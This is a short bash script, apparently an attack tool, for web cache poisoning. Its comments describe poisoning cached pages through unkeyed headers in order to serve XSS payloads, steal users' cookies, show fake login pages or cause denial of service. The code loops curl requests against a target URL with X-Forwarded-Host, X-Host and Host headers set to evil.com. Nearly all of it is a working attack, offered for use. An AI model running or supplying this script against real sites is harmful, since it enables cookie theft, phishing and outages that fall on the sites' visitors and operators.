#!/bin/bash

# multiple requests to the same object will be cached based on a key
# you can exploit the vuln be replacing the value of the unkeyed header with a XSS payload
# or you can import the website files from another malicious controllable source 
# to carry-out malicious actions such as stealing the user's cookies 
# or fake login page
# or DoS



if [ "$#" -ne 2 ]; then
  echo -e "\e[31mUsage: $0 <target url> <number of requests>\e[0m"
  exit 1
fi

URL="$1"
NUM_REQUESTS="$2"
HEADERS=(
  "X-Forwarded-Host: evil.com"
  "X-Host: evil.com"
  "Host: evil.com"
)

for ((i=1; i<=NUM_REQUESTS; i++)); do
  echo "Sending request $i"
  curl -H "${HEADERS[0]}" -H "${HEADERS[1]}" -H "${HEADERS[2]}" "$URL"
done